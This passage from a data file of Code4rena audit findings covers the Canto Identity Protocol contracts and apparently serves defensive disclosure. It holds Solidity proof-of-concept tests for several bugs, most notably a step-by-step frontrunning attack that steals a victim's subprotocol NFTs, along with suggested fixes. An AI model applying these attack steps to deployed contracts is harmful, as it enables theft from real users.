      "content": "\nOnce a subprotocol has been registered in the `SubprotocolRegistry` there is no way to update any of the values. The `SubprotocolData.owner` is the fee recipient leveraged as the fee recipient in [`CidNFT.add`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L193) - which means it may continue to collect fees overtime.\n\nSince subprotocols are created by more than just the inner dev team, it may be more likely that the wallet becomes compromised or the subprotocol team desires switching to a multisig address in the future.\n\nYou could allow transferring the `owner` to another address, potentially with a 2-step process. This would not negatively impact use of the subprotocol, nor change the associated gas costs.\n\nSimilarly, consider allowing other fields to be updated. For example, maybe the subprotocol owner can lower the `fee` at any point but not increase it.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "#l-01-consider-allowing-the-subprotocol-owner-to-be-transferred",
      "tags": [],
      "finders": []
    },
    {
      "id": "8872",
      "title": "[M-04] `CidNFT`: Broken `tokenURI` function",
      "impact": "MEDIUM",
      "content": "\n[`CidNFT#tokenURI`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L133-L142) does not convert the `uint256 _id` argument to a string before interpolating it in the token URI:\n\n```solidity\n    /// @notice Get the token URI for the provided ID\n    /// @param _id ID to retrieve the URI for\n    /// @return tokenURI The URI of the queried token (path to a JSON file)\n    function tokenURI(uint256 _id) public view override returns (string memory) {\n        if (ownerOf[_id] == address(0))\n            // According to ERC721, this revert for non-existing tokens is required\n            revert TokenNotMinted(_id);\n        return string(abi.encodePacked(baseURI, _id, \".json\"));\n    }\n\n```\n\nThis means the raw bytes of the 32-byte ABI encoded integer `_id` will be interpolated into the token URI, e.g. `0x0000000000000000000000000000000000000000000000000000000000000001` for ID `#1`.\n\nMost of the resulting UTF-8 strings will be malformed, incorrect, or invalid URIs. For example, token ID `#1` will show up as the invisible \"start of heading\" control character, and ID `#42` will show as the asterisk symbol `*`. URI-unsafe characters will break the token URIs altogether.\n\n### Impact\n\n*   `CidNFT` tokens will have invalid `tokenURI`s. Offchain tools that read the `tokenURI` view may break or display malformed data.\n\n### Suggestion\n\nConvert the `_id` to a string before calling `abi.encodePacked`. Latest Solmate includes a `LibString` helper library for this purpose:\n\n```solidity\n    import \"solmate/utils/LibString.sol\";\n\n    /// @notice Get the token URI for the provided ID\n    /// @param _id ID to retrieve the URI for\n    /// @return tokenURI The URI of the queried token (path to a JSON file)\n    function tokenURI(uint256 _id) public view override returns (string memory) {\n        if (ownerOf[_id] == address(0))\n            // According to ERC721, this revert for non-existing tokens is required\n            revert TokenNotMinted(_id);\n        return string(abi.encodePacked(baseURI, LibString.toString(_id), \".json\"));\n    }\n\n```\n\n### Test case\n\n```solidity\n    function test_InvalidTokenURI() public {\n        uint256 id1 = cidNFT.numMinted() + 1;\n        uint256 id2 = cidNFT.numMinted() + 2;\n        // mint id1\n        cidNFT.mint(new bytes[](0));\n        // mint id2\n        cidNFT.mint(new bytes[](0));\n\n        // These pass — the raw bytes '0000000000000000000000000000000000000000000000000000000000000001' are interpolated as _id.\n        assertEq(string(bytes(hex\"7462643a2f2f626173655f7572692f00000000000000000000000000000000000000000000000000000000000000012e6a736f6e\")), cidNFT.tokenURI(id1));\n        assertEq(string(bytes(hex\"7462643a2f2f626173655f7572692f00000000000000000000000000000000000000000000000000000000000000022e6a736f6e\")), cidNFT.tokenURI(id2));\n\n        // These fail - the generated string on the right is not the expected string on the left. \n        assertEq(\"tbd://base_uri/1.json\", cidNFT.tokenURI(id1));\n        assertEq(\"tbd://base_uri/2.json\", cidNFT.tokenURI(id2));\n    }\n```\n\n**[OpenCoreCH (Canto Identity) confirmed and commented](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/89#issuecomment-1426179080):**\n > Great catch!\n\n\n\n***\n\n",
      "summary": "\nThis bug report is regarding an issue in the CidNFT smart contract. The vulnerability is that the uint256 _id argument is not converted to a string before being interpolated into the token URI. This means that the raw bytes of the 32-byte ABI encoded integer _id will be interpolated into the token URI, resulting in malformed, incorrect, or invalid URIs. The impact of this is that the CidNFT tokens will have invalid tokenURI's. This can lead to offchain tools that read the tokenURI view breaking or displaying malformed data.\n\nThe suggested solution is to convert the _id to a string before calling abi.encodePacked. This can be done using the LibString helper library included in the latest version of Solmate. A test case has been provided to demonstrate the issue.\n\nIn conclusion, this bug report covers a vulnerability in the CidNFT smart contract, which can lead to invalid tokenURI's. The suggested solution is to convert the _id to a string before calling abi.encodePacked using the LibString helper library.",
      "quality_score": 5,
      "rarity_score": 4.0216169476869865,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "https://github.com/code-423n4/2023-01-canto-identity-findings/issues/89",
      "tags": [
        "ABI Encoding",
        "0x",
        "ERC721"
      ],
      "finders": [
        "horsefacts"
      ]
    },
    {
      "id": "8871",
      "title": "[M-03] Griefing risk in `mint`",
      "impact": "MEDIUM",
      "content": "\n[CidNFT.sol#L147-L157](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L147-L157)<br>\n[CidNFT.sol#L177-L182](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L177-L182)\n\n`CidNFT.mint()` has an optional parameter `_addList` that enables users to register subprotocol NFTs to the CID NFT right after the mint.\n\nHowever, there is no guarantee that the `_cidNFTID`  encoded in `_addList` is the same ID as the newly minted NFT. If there is a pending mint transaction and another user frontrun the mint transaction with higher fee, the previous transaction will revert as the `_cidNFTID` is no longer the expected ID.\n\n[CidNFT.sol#L177-L182](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L177-L182)\n\n```solidity\naddress cidNFTOwner = ownerOf[_cidNFTID];\nif (\n    cidNFTOwner != msg.sender &&\n    getApproved[_cidNFTID] != msg.sender &&\n    !isApprovedForAll[cidNFTOwner][msg.sender]\n) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);\n```\n\nA malicious actor can grief this by frontrunning users that try to mint with non-zero `_addList`, causing their mint transaction to fail.\n\nIn absence of malicious actor, it is also possible for this issue to happen randomly during busy period where a lot of users are trying to mint at the same time.\n\n### Proof of Concept\n\n*   The next CidNFT mint ID is `1000`.\n*   Alice wants to mint and prepares `_addList` with the expected `_cidNFTID` of `1000`.\n*   Bob saw Alice's transaction and frontran her, incrementing the next minting ID to `1001`.\n*   Alice's transaction tries to add subprotocol NFTs to ID `1000` which is owned by Bob. This causes the transaction to revert.\n\n### Recommended Mitigation Steps\n\nModify `mint` so that the minted ID is the one used during the `add` loop, ensuring that `mint` will always succeed.\n\n**[berndartmueller (judge) commented](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/115#issuecomment-1435289830):**\n > Although this submission and [H-01](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/67) both share a common root cause of frontrunning mints and colliding CidNFT ids in the `CidNFT.add` function, it is essential to note that the impact of each issue is significantly different and therefore warrant to be kept separate. \n\n**[OpenCoreCH (Canto Identity) confirmed](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/115#issuecomment-1499329752)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the optional parameter `_addList` in the `CidNFT.mint()` function. This parameter enables users to register subprotocol NFTs to the CID NFT right after the mint. However, there is a potential issue that could occur if a malicious actor or a lot of users are trying to mint at the same time.\n\nThis issue can happen when a malicious actor or multiple users are trying to mint at the same time. For example, if Alice wants to mint and prepares `_addList` with the expected `_cidNFTID` of `1000`, but Bob frontruns her, incrementing the next minting ID to `1001`, Alice's transaction tries to add subprotocol NFTs to ID `1000` which is owned by Bob. This causes the transaction to revert.\n\nIn order to mitigate this issue, the `mint` function should be modified so that the minted ID is the one used during the `add` loop, ensuring that `mint` will always succeed.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "https://github.com/code-423n4/2023-01-canto-identity-findings/issues/115",
      "tags": [],
      "finders": [
        "shenwilly",
        "gzeon"
      ]
    },
    {
      "id": "8870",
      "title": "[M-02] Multiple accounts can have the same identity",
      "impact": "MEDIUM",
      "content": "\n[AddressRegistry.sol#L47](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L47)\n\nUsers can register their on-chain identity (ie their CID NFT) by calling `AddressRegistry.register()`\n\n```solidity\nFile: src/AddressRegistry.sol\n42:     function register(uint256 _cidNFTID) external {\n43:         if (ERC721(cidNFT).ownerOf(_cidNFTID) != msg.sender)\n44:             // We only guarantee that a CID NFT is owned by the user at the time of registration\n45:             // ownerOf reverts if non-existing ID is provided\n46:             revert NFTNotOwnedByUser(_cidNFTID, msg.sender);\n47:         cidNFTs[msg.sender] = _cidNFTID;\n48:         emit CIDNFTAdded(msg.sender, _cidNFTID);\n49:     }\n```\n\nThis overwrites `cidNFTs[msg.sender]` with the `cidNFTID` provided by the caller.\n\nThe issue is that there is nothing preventing several (2 or more) accounts to point to the same `cidNFTID`, ie have `cidNFTs[userA] == cidNFTs[userB]`\n\nNote: the README mentioned that\n\n    Transferring CID NFTs that are still referenced in the address registry: CID NFTs are transferrable on purpose and a user can transfer his CID NFT while it is still registered to his address if he wants to do so.\n\nThe issue described in this report is not that the CID NFT is transferrable, but that several accounts can point to the same CIDNFT id, which lead to several problems outlined below.\n\n### Impact\n\nQuoting the README:\n\n    Canto Identity NFTs (CID NFTs) represent individual on-chain identities\n\nHere, several accounts can point to the same on-chain identity, breaking the requirement that the said identity should be **individual**.\n\nTo illustrate the consequences of this, let us look at `CidNFT.add()`, which adds a new entry for the given subprotocol to the provided CID NFT:\n\n*   data is added by transferring a subprotocol NFT to the contract, which will write the NFT id in `cidData[_cidNFTID][_subprotocolName]`\n*   This NFT id represents traits that will be associated with the identity.\n\nBecause of the issue outlined above, the identity system can be abused:\n\n*   Alice registers her CIDNft by calling `addressRegistry.register(N)`\n*   she transfers it to Bob, who then proceeds to call `addressRegistry.register(N)` to register it.\n*   at this point, `cidNFT` of id `N` points to both Alice and Bob: `addressRegistry.getCID(Alice) == addressRegistry.getCID(Bob)`\n*   Bob calls `CidNFT.add()` to add a subProtocol NFT X to his identity `N` . Because Alice is also associated to the `CIDNFT` `N`, she essentially added this trait for free (assuming subprotocols will monetize their tokens, Bob had to pay the cost of the subProtocol NFT X, but Alice did not).\n*   This can also have further consequences depending on what can be done with these traits (e.g: a protocol giving rewards for users with a trait of the subProtocol NFT X, Bob could be front run by Alice and not receive a reward he was entitled to)\n\nOverall, because this issue impacts a key aspect of the protocol (identities are not individual) and can lead to a form of `theft` in certain conditions (in the scenario above, Alice got a trait added to her identity for \"free\"), the Medium severity seems appropriate.\n\n### Proof Of Concept\n\nThis test shows how two users can point to the same `CID`.<br>\nAdd it to `AddressRegistry.t.sol`\n\n```solidity\nfunction testTwoUsersSameCID() public {\n    uint256 nftIdOne = 1;\n    address Alice = users[0];\n    address Bob = users[1];\n\n    // 1 - Alice mints NFT\n    vm.startPrank(Alice);\n    bytes[] memory addList;\n    cidNFT.mint(addList);\n    assertEq(cidNFT.ownerOf(nftIdOne), Alice);\n\n    // 2 - Alice registers the NFT\n    addressRegistry.register(nftIdOne);\n\n    // 3 - Alice transfers the CID NFT to Bob\n    cidNFT.transferFrom(Alice, Bob, nftIdOne);\n    vm.stopPrank();\n\n    // 4 - Bob registers the nft\n    vm.startPrank(Bob);\n    addressRegistry.register(nftIdOne);\n\n    // 5 - Alice and Bob have the same identity\n    uint256 cidAlice = addressRegistry.getCID(Alice);\n    uint256 cidBob = addressRegistry.getCID(Bob);\n    assertEq(cidAlice, cidBob);\n}\n```\n\n### Tools Used\n\nManual Analysis, Foundry\n\n### Mitigation\n\n`AddressRegistry` should have an additional mapping to track the account associated with a given `cifNTFID`.\n\n```diff\nFile: src/AddressRegistry.sol\n20:     /// @notice Stores the mappings of users to their CID NFT\n21:     mapping(address => uint256) private cidNFTs;\n+       mapping(uint256 => address) private accounts;\n```\n\nWhen registering, the code would check if the `cidNFTID` has an account associated with it.\nIf that is the case, `cidNFTs` for this user would be set to 0, preventing several users from having the same identity.\n\n```diff\nFile: src/AddressRegistry.sol\n42: function register(uint256 _cidNFTID) external {\n43:         if (ERC721(cidNFT).ownerOf(_cidNFTID) != msg.sender)\n44:             // We only guarantee that a CID NFT is owned by the user at the time of registration\n45:             // ownerOf reverts if non-existing ID is provided\n46:             revert NFTNotOwnedByUser(_cidNFTID, msg.sender);\n+           if (accounts[_cidNFTID] != address(0)) {\n+                 delete cidNFTs[accounts[_cidNFTID]];\n+                 emit CIDNFTRemoved(accounts[_cidNFTID], _cidNFTID);\n+}\n47:         cidNFTs[msg.sender] = _cidNFTID;\n+           accounts[_cidNFTID] = msg.sender;\n48:         emit CIDNFTAdded(msg.sender, _cidNFTID);\n49:     }\n```\n\n**[OpenCoreCH (Canto Identity) confirmed and commented](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/177#issuecomment-1431920998):**\n > I first thought that this is intended behaviour because the same identity/person can have multiple wallets. But after seeing the examples in the findings and discussing this internally, it will be changed such that registrations are removed on transfer.\n\n\n\n***\n\n",
      "summary": "\nA bug was reported in the AddressRegistry.sol code in the Canto Identity protocol, which allows multiple accounts to point to the same CID NFTID. This breaks the requirement that the said identity should be individual and could lead to a form of \"theft\" in certain conditions. As an example, Alice could register her CIDNFT and then transfer it to Bob. Bob then registers the same CIDNFT, and Alice essentially gets a trait added to her identity for \"free\".\n\nTo mitigate this issue, AddressRegistry.sol should have an additional mapping to track the account associated with a given CifNTFID. When registering, the code would check if the CIDNFTID has an account associated with it. If that is the case, CIDNFTs for this user would be set to 0, preventing several users from having the same identity.\n\nThis bug was tested by adding a function to AddressRegistry.t.sol that shows how two users can point to the same CID. Manual Analysis and Foundry were the tools used to identify and assess the bug.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "https://github.com/code-423n4/2023-01-canto-identity-findings/issues/177",
      "tags": [],
      "finders": [
        "csanuragjain",
        "MiniGlome",
        "glcanvas",
        "hihen",
        "joestakey",
        "Ruhum",
        "wait",
        "shenwilly",
        "chaduke",
        "adriro",
        "libratus"
      ]
    },
    {
      "id": "8869",
      "title": "[M-01] Adding NFTS with AssociationType ORDERED or PRIMARY may cause overwriting",
      "impact": "MEDIUM",
      "content": "\n***Note: Prior to this audit, a group of wardens added test coverage. While auditing was not the purpose of the testing phase, relevant and valuable findings reported during that timeframe were eligible to be judged. As such, this finding [M-01] was discovered during the \"testing squad\" phase and is being included here for completeness.***\n\nSubprotocol NFTs may be trapped in contract CidNFT forever.\n\n### Proof of Concept\n\nWhen adding NFT to CidNFT with AssociationType ORDERED or PRIMARY, the cidData is written directly, without checking and handling the case that a previously added nft may not have been removed:\n\n    if (_type == AssociationType.ORDERED) {\n        if (!subprotocolData.ordered) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\n        cidData[_cidNFTID][_subprotocolName].ordered[_key] = _nftIDToAdd;\n        emit OrderedDataAdded(_cidNFTID, _subprotocolName, _key, _nftIDToAdd);\n    } else if (_type == AssociationType.PRIMARY) {\n        if (!subprotocolData.primary) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\n        cidData[_cidNFTID][_subprotocolName].primary = _nftIDToAdd;\n        emit PrimaryDataAdded(_cidNFTID, _subprotocolName, _nftIDToAdd);\n    ...\n\nFor `AssociationType.ORDERED`:<br>\nIf `(key1, subNft1)` and `(key1, subNft2)` were added consecutively, `subNft1` would be trapped in the contract forever, because `subNft1` stored in `cidData` was overwritten by `subNft2`, and only `subNft2` can be retrieved through `CidNFT.remove()`.\n\nFor `AssociationType.PRIMARY`:<br>\nIf `subNft1` and `subNft2` were added consecutively, `subNft1` would be trapped in the contract forever, because `subNft1` stored in `cidData` was overwritten by `subNft2`, and only `subNft2` can be retrieved through `CidNFT.remove()`.\n\nTest code for PoC:\n\n    diff --git a/src/test/CidNFT.t.sol b/src/test/CidNFT.t.sol\n    index 8a6a87a..45d91bd 100644\n    --- a/src/test/CidNFT.t.sol\n    +++ b/src/test/CidNFT.t.sol\n    @@ -67,6 +67,81 @@ contract CidNFTTest is DSTest, ERC721TokenReceiver {\n             vm.stopPrank();\n         }\n     \n    +    function testTrappedByAddingOrdered() public {\n    +        address user = user2;\n    +        vm.startPrank(user);\n    +\n    +        // mint two nft for user\n    +        (uint256 nft1, uint256 nft2) = (101, 102);\n    +        sub1.mint(user, nft1);\n    +        sub1.mint(user, nft2);\n    +        sub1.setApprovalForAll(address(cidNFT), true);\n    +        // mint CidNFT\n    +        uint256 cid = cidNFT.numMinted() + 1;\n    +        cidNFT.mint(new bytes[](0));\n    +        uint256 key = 111;\n    +\n    +        // add nft1 to CidNFT a key\n    +        cidNFT.add(cid, \"sub1\", key, nft1, CidNFT.AssociationType.ORDERED);\n    +        // add nft2 to CidNFT with the same key\n    +        cidNFT.add(cid, \"sub1\", key, nft2, CidNFT.AssociationType.ORDERED);\n    +\n    +        // confirm: both nft1 and nft2 have been transferred to CidNFT\n    +        assertEq(sub1.ownerOf(nft1), address(cidNFT));\n    +        assertEq(sub1.ownerOf(nft2), address(cidNFT));\n    +\n    +        // the first remove will success\n    +        cidNFT.remove(cid, \"sub1\", key, nft1, CidNFT.AssociationType.ORDERED);\n    +        // nft2 has been transferred back to the user\n    +        assertEq(sub1.ownerOf(nft2), user);\n    +\n    +        // the second remove will fail for OrderedValueNotSet\n    +        vm.expectRevert(abi.encodeWithSelector(CidNFT.OrderedValueNotSet.selector, cid, \"sub1\", key));\n    +        cidNFT.remove(cid, \"sub1\", key, nft1, CidNFT.AssociationType.ORDERED);\n    +        // nft1 is trapped in CidNFT forever\n    +        assertEq(sub1.ownerOf(nft1), address(cidNFT));\n    +\n    +        vm.stopPrank();\n    +    }\n    +\n    +    function testTrappedByAddingPrimary() public {\n    +        address user = user2;\n    +        vm.startPrank(user);\n    +\n    +        // mint two nft for user\n    +        (uint256 nft1, uint256 nft2) = (101, 102);\n    +        sub1.mint(user, nft1);\n    +        sub1.mint(user, nft2);\n    +        sub1.setApprovalForAll(address(cidNFT), true);\n    +        // mint CidNFT\n    +        uint256 cid = cidNFT.numMinted() + 1;\n    +        cidNFT.mint(new bytes[](0));\n    +        // key is useless when adding PRIMARY type\n    +        uint256 key = 111;\n    +\n    +        // add nft1 to CidNFT\n    +        cidNFT.add(cid, \"sub1\", key, nft1, CidNFT.AssociationType.PRIMARY);\n    +        // add nft2 to CidNFT\n    +        cidNFT.add(cid, \"sub1\", key, nft2, CidNFT.AssociationType.PRIMARY);\n    +\n    +        // confirm: both nft1 and nft2 have been transferred to CidNFT\n    +        assertEq(sub1.ownerOf(nft1), address(cidNFT));\n    +        assertEq(sub1.ownerOf(nft2), address(cidNFT));\n    +\n    +        // the first remove will success\n    +        cidNFT.remove(cid, \"sub1\", key, nft1, CidNFT.AssociationType.PRIMARY);\n    +        // nft2 has been transferred back to the user\n    +        assertEq(sub1.ownerOf(nft2), user);\n    +\n    +        // the second remove will fail for PrimaryValueNotSet\n    +        vm.expectRevert(abi.encodeWithSelector(CidNFT.PrimaryValueNotSet.selector, cid, \"sub1\"));\n    +        cidNFT.remove(cid, \"sub1\", key, nft1, CidNFT.AssociationType.PRIMARY);\n    +        // nft1 is trapped in CidNFT forever\n    +        assertEq(sub1.ownerOf(nft1), address(cidNFT));\n    +\n    +        vm.stopPrank();\n    +    }\n    +\n         function testAddID0() public {\n             // Should revert if trying to add NFT ID 0\n             vm.expectRevert(abi.encodeWithSelector(CidNFT.NotAuthorizedForCIDNFT.selector, address(this), 0, address(0)));\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nShould revert the tx if an overwriting is found in CidNFT.add():\n\n    diff --git a/src/CidNFT.sol b/src/CidNFT.sol\n    index b6c88de..c389971 100644\n    --- a/src/CidNFT.sol\n    +++ b/src/CidNFT.sol\n    @@ -101,6 +101,8 @@ contract CidNFT is ERC721, ERC721TokenReceiver {\n         error AssociationTypeNotSupportedForSubprotocol(AssociationType associationType, string subprotocolName);\n         error NotAuthorizedForCIDNFT(address caller, uint256 cidNFTID, address cidNFTOwner);\n         error NotAuthorizedForSubprotocolNFT(address caller, uint256 subprotocolNFTID);\n    +    error OrderedKeyIsSetAlready(uint256 cidNFTID, string subprotocolName, uint256 key, uint256 nftIDToAdd);\n    +    error PrimaryIsSetAlready(uint256 cidNFTID, string subprotocolName, uint256 nftIDToAdd);\n         error ActiveArrayAlreadyContainsID(uint256 cidNFTID, string subprotocolName, uint256 nftIDToAdd);\n         error OrderedValueNotSet(uint256 cidNFTID, string subprotocolName, uint256 key);\n         error PrimaryValueNotSet(uint256 cidNFTID, string subprotocolName);\n    @@ -191,10 +193,16 @@ contract CidNFT is ERC721, ERC721TokenReceiver {\n             }\n             if (_type == AssociationType.ORDERED) {\n                 if (!subprotocolData.ordered) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\n    +            if (cidData[_cidNFTID][_subprotocolName].ordered[_key] != 0) {\n    +                revert OrderedKeyIsSetAlready(_cidNFTID, _subprotocolName, _key, _nftIDToAdd);\n    +            }\n                 cidData[_cidNFTID][_subprotocolName].ordered[_key] = _nftIDToAdd;\n                 emit OrderedDataAdded(_cidNFTID, _subprotocolName, _key, _nftIDToAdd);\n             } else if (_type == AssociationType.PRIMARY) {\n                 if (!subprotocolData.primary) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);\n    +            if (cidData[_cidNFTID][_subprotocolName].primary != 0) {\n    +                revert PrimaryIsSetAlready(_cidNFTID, _subprotocolName, _nftIDToAdd);\n    +            }\n                 cidData[_cidNFTID][_subprotocolName].primary = _nftIDToAdd;\n                 emit PrimaryDataAdded(_cidNFTID, _subprotocolName, _nftIDToAdd);\n             } else if (_type == AssociationType.ACTIVE) {\n\n**[OpenCoreCH (Canto Identity) confirmed](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/187#issuecomment-1499331349)**\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed for the code in the contract CidNFT. The risk rating for this bug is medium. The bug causes subprotocol NFTs to be trapped in the contract CidNFT forever. This happens when adding NFTs to the contract with AssociationType ORDERED or PRIMARY. When adding NFTs with these types, the cidData is written directly, without checking and handling the case that a previously added NFT may not have been removed. \n\nThe proof of concept and test code for this bug can be found in the report. The recommended mitigation steps for this bug are to revert the transaction if an overwriting is found in the CidNFT.add() function. The tools used for this bug report are VS Code.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "https://github.com/code-423n4/2023-01-canto-identity-findings/issues/187",
      "tags": [],
      "finders": [
        "hihen"
      ]
    },
    {
      "id": "8868",
      "title": "[H-01] Attacker can frontrun a victim's `mint`+`add` transaction to steal NFT",
      "impact": "HIGH",
      "content": "\n[CidNFT.sol#L147](https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L147)<br>\n[CidNFT.sol#L165](https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L165)<br>\n[CidNFT.sol#L237](https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L237)\n\nHigh - an attacker can steal deposited NFTs from victims using the `mint()` + `add()` functionality in `CidNFT.sol`\n\n### Proof of Concept\n\nOne of the core features of CID Protocol is the ability for users to attach Subprotocol NFTs to their `CidNFT`. The `CidNFT` contract custodies these attached NFTs, and they are regarded as \"traits\" of the user.\n\nThe protocol currently includes functionality for a user to mint a `CidNFT` as their identity and then optionally add a subprotocol NFT to that `CidNFT` in the same transaction. This occurs in the `mint()` function of `CidNFT.sol`, which takes a byte array of `add()` parameters and includes a loop where `add()` can be repeatedly called with these parameters to attach subprotocol NFTs to the `CidNFT`.\n\n```\n\nfunction mint(bytes[] calldata _addList) external {\n    _mint(msg.sender, ++numMinted); \n    bytes4 addSelector = this.add.selector;\n    for (uint256 i = 0; i < _addList.length; ++i) {\n        (bool success /*bytes memory result*/, ) = address(this)\n            .delegatecall(abi.encodePacked(addSelector, _addList[i]));\n        if (!success) revert AddCallAfterMintingFailed(i);\n    }\n}\n```\n\nOne of the arguments for `add()` is the `_cidNFTID` to which the user would like to attach their outside NFT. However, `_cidNFTID` is specified in calldata to `mint()`, and there is no guarantee that the user is actually `add()`ing to the `CidNFT` that they just minted. There is only a check in `add()` that the user is either the owner or approved for that `CidNFT`.\n\n    function add(\n            uint256 _cidNFTID, // No guarantee that this is the CidNFT id that was just minted by the user\n            string calldata _subprotocolName,\n            uint256 _key,\n            uint256 _nftIDToAdd,\n            AssociationType _type\n        ) external {\n        ...............\n        if (\n            cidNFTOwner != msg.sender &&\n            getApproved[_cidNFTID] != msg.sender &&\n            !isApprovedForAll[cidNFTOwner][msg.sender]\n        ) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);\n        ...............\n    }\n\nThis opens up the following attack:\n\n1.  Victim sends a transaction expecting to mint `CidNFT #100`, and includes calldata to `add()` their SubprotocolNFT to the token in the same tx\n2.  Attacker frontruns this transaction with a `mint()` with no `add()` parameters, receives `CidNFT #100`, and sets the victim as approved for that token\n3.  The victim's transaction begins execution, and they instead receive token #101, though their `add()` calldata still specifies token #100\n4.  The victim's `add()` call continues, and their SubprotocolNFT is registered to `CidNFT #100` and transferred to the `CidNFT` contract\n5.  The attacker can then either revoke approval to the victim for `CidNFT #100` or immediately call `remove()` to transfer the victim's SubprotocolNFT to themselves\n\nBelow is a forge test executing this attack. This should run if dropped into `CidNFT.t.sol`.\n\n    function testMaliciousMint() public {\n        uint256 cidTokenId = cidNFT.numMinted() + 1;\n        (uint256 subTokenId1, uint256 subTokenId2) = (1, 2);\n        (uint256 key1, uint256 key2) = (1, 2);\n\n        // user1 == attacker\n        // user2 == victim\n        // Frontrun the victim's mint by minting the cidNFT token they expect before them\n        vm.startPrank(user1);\n        cidNFT.mint(new bytes[](0));\n\n        // Set the victim (user2) as approved for the token user1 just minted\n        cidNFT.setApprovalForAll(user2, true);\n        vm.stopPrank();\n\n        // Mint user2 the subtokens that user1 wants to steal, approve the CidNFT contract\n        // for the subtokens, and prepare the addlist with the incorrect cidNFT token id\n        vm.startPrank(user2);\n        sub1.mint(user2, subTokenId1);\n        sub1.mint(user2, subTokenId2);\n        sub1.setApprovalForAll(address(cidNFT), true);\n\n        bytes[] memory addList = new bytes[](2);\n        addList[0] = abi.encode(\n            cidTokenId,\n            \"sub1\",\n            key1,\n            subTokenId1,\n            CidNFT.AssociationType.ORDERED\n        );\n        addList[1] = abi.encode(\n            cidTokenId,\n            \"sub1\",\n            key2,\n            subTokenId2,\n            CidNFT.AssociationType.ORDERED\n        );\n\n        // Mint user2 a new CidNFT and attach the subtokens to user1's CidNFT\n        cidNFT.mint(addList);\n        vm.stopPrank();\n\n        // Confirm that user1's CidNFT has the subtokens and can transfer them out\n        vm.startPrank(user1);\n        cidNFT.remove(\n            cidTokenId,\n            \"sub1\",\n            key1,\n            subTokenId1,\n            CidNFT.AssociationType.ORDERED\n        );\n        cidNFT.remove(\n            cidTokenId,\n            \"sub1\",\n            key2,\n            subTokenId2,\n            CidNFT.AssociationType.ORDERED\n        );\n        vm.stopPrank();\n\n        // Confirm that user1 now holds the subtokens\n        assertEq(cidNFT.ownerOf(cidTokenId), user1);\n        assertEq(cidNFT.ownerOf(cidTokenId + 1), user2);\n        assertEq(sub1.ownerOf(subTokenId1), user1);\n        assertEq(sub1.ownerOf(subTokenId2), user1);\n    }\n    ## Tools Used\n    Manual review\n\n    ## Recommended Mitigation Steps\n    - Enforce that the user can only `add()` to the CidNFT that they just minted rather than allowing for arbitrary IDs\n\n**[OpenCoreCH (Canto Identity) confirmed and commented](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/67#issuecomment-1426123803):**\n > Great finding, will be fixed.\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the code of the CID Protocol, which allows an attacker to steal deposited NFTs from victims. The vulnerability occurs in the `mint()` function of the `CidNFT.sol` contract, which takes a byte array of `add()` parameters and includes a loop where `add()` can be repeatedly called with these parameters to attach subprotocol NFTs to the `CidNFT`. \n\nThe attacker can frontrun the victim's transaction by minting the CidNFT token they expect before them and setting the victim as approved for that token. The victim's transaction begins execution, and they instead receive token #101, though their `add()` calldata still specifies token #100. The victim's `add()` call continues, and their SubprotocolNFT is registered to `CidNFT #100` and transferred to the `CidNFT` contract, allowing the attacker to either revoke approval to the victim for `CidNFT #100` or immediately call `remove()` to transfer the victim's SubprotocolNFT to themselves.\n\nThe recommended mitigation step for this vulnerability is to enforce that the user can only `add()` to the CidNFT that they just minted rather than allowing for arbitrary IDs.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Canto Identity Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "https://github.com/code-423n4/2023-01-canto-identity-findings/issues/67",
      "tags": [
        "Front-Running"
